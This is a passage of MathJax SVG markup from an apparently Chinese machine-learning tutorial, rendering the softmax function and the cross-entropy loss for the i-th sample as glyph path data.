126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1155.1,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(2210.9,0)\"><g data-mml-node=\"msup\" transform=\"translate(1536.1,676)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,363) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-935.6)\"><g data-mml-node=\"munderover\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M61 748Q64 750 489 750H913L954 640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1089,477.1) scale(0.707)\"><path data-c=\"1D436\" d=\"M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(1089,-285.4) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D458\" d=\"M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(521,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(1299,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g><g data-mml-node=\"msup\" transform=\"translate(2577.8,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,289) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D458\" d=\"M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z\"/></g></g></g></g></g><rect width=\"3977.6\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mspace\" transform=\"translate(6428.5,0)\"/></g></g></svg></mjx-container></span> 第 i 个样本的损失函数为： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -2.864ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"62.574ex\" height=\"6.82ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1748.5 27657.5 3014.2\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(714,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1285.7,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2341.5,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3286.2,0)\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(4564.2,0)\"><path data-c=\"2061\" d=\"\"/></g><g data-mml-node=\"mo\" transform=\"translate(4564.2,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(4953.2,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(536,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(523,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g><g data-mml-node=\"mo\" transform=\"translate(6116.8,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(6783.6,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(7839.4,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(8784.1,0)\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(10062.1,0)\"><path data-c=\"2061\" d=\"\"/></g><g data-mml-node=\"mo\" transform=\"translate(10062.1,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"msup\" transform=\"translate(10451.1,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,413) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(502,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(523,-307.4)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g></g></g><g data-mml-node=\"mo\" transform=\"translate(11849.4,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(12460.6,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(13460.8,0)\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(14738.8,0)\"><path data-c=\"2061\" d=\"\"/></g><g data-mml-node=\"mo\" transform=\"translate(14738.8,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"munderover\" transform=\"translate(15127.8,0)\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(86,-1107.7) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D458\" d=\"M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(521,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(1299,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mi\" transform=\"translate(453.3,1150) scale(0.707)\"><path data-c=\"1D436\" d=\"M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 